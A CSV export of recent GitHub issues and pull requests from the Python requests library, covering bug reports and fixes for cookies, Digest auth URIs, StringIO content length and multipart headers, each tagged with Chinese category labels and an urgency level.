id,title,body,category,urgency,html_url
3295353684,ModuleNotFoundError,"  File ""/usr/lib/python3.13/site-packages/requests/__init__.py"", line 43, in <module>
    import urllib3
  File ""/usr/lib/python3.13/site-packages/urllib3/__init__.py"", line 14, in <module>
    from . import exceptions
  File ""/usr/lib/python3.13/site-packages/urllib3/exceptions.py"", line 7, in <module>
    from http.client import IncompleteRead as httplib_IncompleteRead
ModuleNotFoundError: No module named 'http.client'; 'http' is not a package","Bug反馈, 功能建议",中,https://github.com/psf/requests/issues/7006
3295285881,security: update publish workflow to use `artifact-id` instead of `name`,"## Use `artifact-id` instead of `name` with Actions Artifacts 🔒 

This pull updates the **publish** workflow to use `artifact-id` instead of `name` when downloading artifacts that have been previously published in prior workflow steps. This is important because artifacts produced by GitHub Actions can be completely overwritten by other workflow runs if they use the same `name` under very unique circumstances (like passing the `run-id` value to the download-artifact action to point to an entirely different workflow run - don't do that). To avoid potential TOCTOU issues/vulnerabilities where an artifact might be replaced between upload and download, the new `artifact-ids` input allows you to download artifacts by their specific ID rather than by name. This is safer but also helps lead to more deterministic workflow builds by referencing the artifact you wish to download by its _exact id_.

This PR also hardens the workflow a bit by adding `persist-credentials: false` to the checkout step.

---

I recently did some work to land these exact changes in the [urllib3/urllib3](https://github.com/urllib3/urllib3/pulls?q=is%3Apr+is%3Aclosed+author%3AGrantBirki) and wanted to contribute those same changes here as well!","Bug反馈, 账号问题",中,https://github.com/psf/requests/pull/7005
3292227381,Fix-#7003: RequestsCookieJar cannot correctly retrieve zero value,"When using RequestsCookieJar to set a cookie with an empty string ('') or 0 as the value, it cannot be retrieved properly afterward.  (Fix #7003)","Bug反馈, 功能建议",中,https://github.com/psf/requests/pull/7004
3292148459,"When using RequestsCookieJar to set a cookie with an empty string ('') or 0 as the value, it cannot be retrieved properly afterward.","When using RequestsCookieJar to set a cookie with an empty string ('') or 0 as the value, it cannot be retrieved properly afterward.

## Expected Result

It can be retrieved properly after being set.

## Actual Result

It cannot be retrieved properly after being set.

## Reproduction Steps

```python
from requests.cookies import RequestsCookieJar

jar = RequestsCookieJar()

jar.set('token', 0, domain='example.com', path='/')

print(""Jar contents:"", list(jar.items()))  # [('token', 0)]
print(""jar.get:"", jar.get('token', domain='example.com', path='/'))  # it should return 0 instead of None.

try:
    print(""jar['token']:"", jar['token'])  # it should return 0 instead of raising an error.
except KeyError as e:
    print(""KeyError raised unexpectedly:"", e)

```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""2.0.12""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.7""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.6.8""
  },
  ""platform"": {
    ""release"": ""3.10.0-1160.119.1.el7.x86_64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.27.1""
  },
  ""system_ssl"": {
    ""version"": ""100020bf""
  },
  ""urllib3"": {
    ""version"": ""1.26.19""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}

```
","Bug反馈, 功能建议, 文档问题",中,https://github.com/psf/requests/issues/7003
3286622470,Teat,,其他,中,https://github.com/psf/requests/issues/7002
3280460825,Dynamic import causing FileNotFoundError in shrinkwrapped applications after deployment of new versioon,"https://github.com/psf/requests/blob/970e8cec988421bd43da57350723b05c8ce8dc7e/src/requests/utils.py#L214

The dynamic import in the referenced code above is causing errors with shrinkwrapped scripts whenever we try to replace an old version with a new one while an old script is running because the old script execution tries to access a python path that has been replaced by the new version of the script. See the sequence of events below:

1. script.v1.0 running
2. script.v2.0  is deployed to replacev1.0
3. running script.v.1.0 makes a POST request and fails at the dynamic upload with FileNotFoundError","Bug反馈, 功能建议",中,https://github.com/psf/requests/issues/7001
3275325151,Fix stringio content length,"fix(utils): correct Content-Length for io.StringIO bodies (#6917)

- Add special handling for io.StringIO in super_len() function
- Calculate byte length by encoding StringIO content as UTF-8
- Preserve stream position to avoid surprising users
- Fixes incorrect Content-Length header when StringIO contains multi-byte UTF-8 characters
- Test multi-byte UTF-8 characters (💩, 🚀, 🎉)
- Test position preservation after super_len call
- Test partial read scenarios
- Test PreparedRequest Content-Length header
- Test consistency with str and bytes behavior
- All tests verify correct byte-length calculation""","Bug反馈, 功能建议, 账号问题",中,https://github.com/psf/requests/pull/7000
3271028383,Bump step-security/harden-runner from 2.12.0 to 2.13.0,"Bumps [step-security/harden-runner](https://github.com/step-security/harden-runner) from 2.12.0 to 2.13.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/step-security/harden-runner/releases"">step-security/harden-runner's releases</a>.</em></p>
<blockquote>
<h2>v2.13.0</h2>
<h2>What's Changed</h2>
<ul>
<li>Improved job markdown summary</li>
<li>Https monitoring for all domains (included with the enterprise tier)</li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/step-security/harden-runner/compare/v2...v2.13.0"">https://github.com/step-security/harden-runner/compare/v2...v2.13.0</a></p>
<h2>v2.12.2</h2>
<h2>What's Changed</h2>
<p>Added HTTPS Monitoring for additional destinations - *.githubusercontent.com
Bug fixes:</p>
<ul>
<li>Implicitly allow local multicast, local unicast and broadcast IP addresses in block mode</li>
<li>Increased policy map size for block mode</li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/step-security/harden-runner/compare/v2...v2.12.2"">https://github.com/step-security/harden-runner/compare/v2...v2.12.2</a></p>
<h2>v2.12.1</h2>
<h2>What's Changed</h2>
<ul>
<li>Detection capabilities have been upgraded to better recognize attempts at runner tampering. These improvements are informed by real-world incident learnings, including analysis of anomalous behaviors observed in the tj-actions and reviewdog supply chain attack.</li>
<li>Resolved an issue where the block policy was not enforced correctly when the GitHub Actions job was running inside a container on a self-hosted VM runner.</li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/step-security/harden-runner/compare/v2...v2.12.1"">https://github.com/step-security/harden-runner/compare/v2...v2.12.1</a></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/step-security/harden-runner/commit/ec9f2d5744a09debf3a187a3f4f675c53b671911""><code>ec9f2d5</code></a> Merge pull request <a href=""https://redirect.github.com/step-security/harden-runner/issues/565"">#565</a> from step-security/rc-24</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/04bcbc31cfcefe0cf4720832008735021cec5ec4""><code>04bcbc3</code></a> update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/7c7a56fcaa124ab72fff1cc3e81257f264fd7317""><code>7c7a56f</code></a> feat: get job summary from API</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/6c439dc8bdf85cadbbce9ed30d1c7b959517bc49""><code>6c439dc</code></a> Merge pull request <a href=""https://redirect.github.com/step-security/harden-runner/issues/562"">#562</a> from step-security/rc-22</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/bf5688696d0b2cf8221eadb38e4232386015763a""><code>bf56886</code></a> update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/5436dac7b5fa76a1a179168f5f4de86c00e22c84""><code>5436dac</code></a> update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/88d305a3530acfa6d1939000baaa571e520df9c8""><code>88d305a</code></a> update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/b976878278dbe3bc16039f7165b8faf809c50297""><code>b976878</code></a> update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/875cc92db280a03598e7492a3e6c165c689f7af6""><code>875cc92</code></a> Update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/002fdce3c6a235733a90a27c80493a3241e56863""><code>002fdce</code></a> Merge pull request <a href=""https://redirect.github.com/step-security/harden-runner/issues/544"">#544</a> from step-security/rc-21</li>
<li>Additional commits viewable in <a href=""https://github.com/step-security/harden-runner/compare/0634a2670c59f64b4a01f0f96f84700a4088b9f0...ec9f2d5744a09debf3a187a3f4f675c53b671911"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=step-security/harden-runner&package-manager=github_actions&previous-version=2.12.0&new-version=2.13.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bug反馈, 功能建议, 账号问题, 文档问题",中,https://github.com/psf/requests/pull/6999
3253318259,Test2,,其他,中,https://github.com/psf/requests/pull/6998
3252697709,Test,,其他,中,https://github.com/psf/requests/pull/6997
3243694956,Remove the unused tox and flake8 sections from Makefile,,其他,中,https://github.com/psf/requests/pull/6996
3243607325,Install tox and flake8 dependency to run make test and make flake8,I see that setting up this project as per the Makefile needs `tox` to run `make test` and `flake8` to run `make flake8`. I do not see these mentioned anywhere in the project installation steps that people need to install the pip package first before running the commands. This MR adds the `tox` and `flake8` dependency to dev requirements. ,其他,中,https://github.com/psf/requests/pull/6995
3241489178,docs: clarify timeout parameter uses seconds in Session.request,"- Updated Session.request() docstring to match requests.request()
- Changed 'How long to wait' to 'How many seconds to wait'
- Fixes inconsistency in timeout documentation

Fixes #6813","Bug反馈, 功能建议, 网络连接失败, 文档问题",中,https://github.com/psf/requests/pull/6994
3241108091,Add support for Python 3.14 and drop support for Python 3.8,"This PR will start testing Python 3.14 to make sure we're ready for the October release. Assuming tests run, I'll add trove classifiers and change log notes. We'll also drop Python 3.8 support as we're now almost a year past its [official end of support](https://devguide.python.org/versions/).",其他,高,https://github.com/psf/requests/pull/6993
3239837825,POST Multipart-Encoding does not work if the Content-Type header has been previously defined in the session,"Hi,

I just [wasted two hours](https://notes.sklein.xyz/2025-07-17_1544/) because it seems that the [POST Multiple Multipart-Encoded Files](https://requests.readthedocs.io/en/latest/user/advanced/#post-multiple-multipart-encoded-files) function does not work if a `Content-Type` has been previously defined at the session level.

Example:

```

...

session.headers.update({“Content-Type”: “application/json”})

...

response = session.post(
    “http://localhost:3000/api/v1/pipelines/upload”,
    files={
        “file”: (“hello_world3.py”, f, “text/x-python”)
    },
    data={
        “urlIdx”: “2”
    }
)
```

Two suggestions:

- `a.` Either modify the implementation of [POST Multiple Multipart-Encoded Files](https://requests.readthedocs.io/en/latest/user/advanced/#post-multiple-multipart-encoded-files) to overwrite the content of the `Content-Type` header even if it has been defined at the session level
- `b.` Or issue a warning message to inform the developer of their possible error

What do you think?

Best regards,
Stéphane","Bug反馈, 功能建议, 账号问题, 文档问题",中,https://github.com/psf/requests/issues/6992
3226571235,Fix: Correct Digest Auth URI handling for semicolons in path (#6990),"修复目标：Fixes #6990）

问题原因：（URL 被错误解析导致 Authorization 中 URI 字段不完整）

修复方式：当请求 URL 的 path 中包含分号（;）时，requests 在进行 HTTP Digest 认证时，Authorization 头中的 uri 字段会丢失分号及其后面的内容，导致认证失败或行为异常。例如，访问如下 URL 时：原有实现只保留了分号前的部分，uri 字段变成了 /path1;param1/part2?foo=bar，丢失了 ;param2。修复方案修改 src/requests/auth.py 中 HTTPDigestAuth.build_digest_header 方法，拼接 path 和 params 字段，确保 uri 字段完整保留分号及其后的内容，符合 RFC 7616 要求。

影响范围：只影响 Digest 认证场景，且仅在 URL 路径中包含分号参数时有影响。兼容性良好，不影响其他认证方式和普通请求。
测试用例。新增测试用例（tests/test1.py），验证 uri 字段在包含分号参数时能正确生成。

","Bug反馈, 功能建议, 账号问题",中,https://github.com/psf/requests/pull/6991
3225565650,`uri` field of digest authentication incorrectly filled when the URL contains semicolons in path,"<!-- Summary. -->
When there is a semicolon (`;`) in the request URL path, and when doing HTTP Digest Authentication, `requests` incorrectly fills the `uri` field of the `Authorization` header by ignoring the rest of the path.

As per [RFC 7616](https://www.rfc-editor.org/rfc/rfc7616#page-9), the `uri` field contains the ""Effective Request URI"", which should contain the same path we are trying to access.

## Expected Result

<!-- What you expected. -->
The `uri` field should contain the same path as the request when it contains semicolons.

## Actual Result

<!-- What happened instead. -->
The `uri` field removes everything from the first semicolon it finds in the path, up to the parameters.

## Reproduction Steps

The following example is where I found this problem: this tries to add 2 releases to a MusicBrainz collection.
The API uses a semicolon as a separator for adding multiple releases at once.

The following *will* return a 401 since the collection is private, but since the problem is in the `uri` field, it is not a problem to reproduce the bug.

```python
import requests
from requests.auth import HTTPDigestAuth

res = requests.put(""https://musicbrainz.org/ws/2/collection/53f4a001-eb45-4b72-9ec5-41109e88710d/releases/7dc2cfbd-5bd8-4ebc-b20b-4344985431da;38347564-5ef3-46dd-ad87-fe6d6f1e7b19?fmt=json&client=manual-python-requests-test"", auth=HTTPDigestAuth(""username"", ""password""))

res.request.headers['Authorization']
>>> [...] uri=""/ws/2/collection/53f4a001-eb45-4b72-9ec5-41109e88710d/releases/7dc2cfbd-5bd8-4ebc-b20b-4344985431da?fmt=json&client=manual-python-requests-test"" [...]
```

Only the first release has been kept! The query parameters are however untouched, so this is not a simple ""I see semicolon, I ignore everything after"".

Also, doing the same request with `curl` works as expected, as it correctly fills the `uri` field:
```bash
curl -X PUT ""https://musicbrainz.org/ws/2/collection/53f4a001-eb45-4b72-9ec5-41109e88710d/releases/7dc2cfbd-5bd8-4ebc-b20b-4344985431da;38347564-5ef3-46dd-ad87-fe6d6f1e7b19?fmt=json&client=manual-curl-test"" --digest -u ""username:password"" -v

# [...] A lot of lines
> [...] uri=""/ws/2/collection/53f4a001-eb45-4b72-9ec5-41109e88710d/releases/7dc2cfbd-5bd8-4ebc-b20b-4344985431da;38347564-5ef3-46dd-ad87-fe6d6f1e7b19?fmt=json&client=manual-curl-test"" [...]
```

Also, the request works with `requests` if I manually escape the semicolons as `%3B`, but one shouldn't have to.

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.5""
  },
  ""platform"": {
    ""release"": ""6.15.6"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.4""
  },
  ""system_ssl"": {
    ""version"": ""30200040""
  },
  ""urllib3"": {
    ""version"": ""2.5.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bug反馈, 功能建议, 账号问题, 文档问题",中,https://github.com/psf/requests/issues/6990
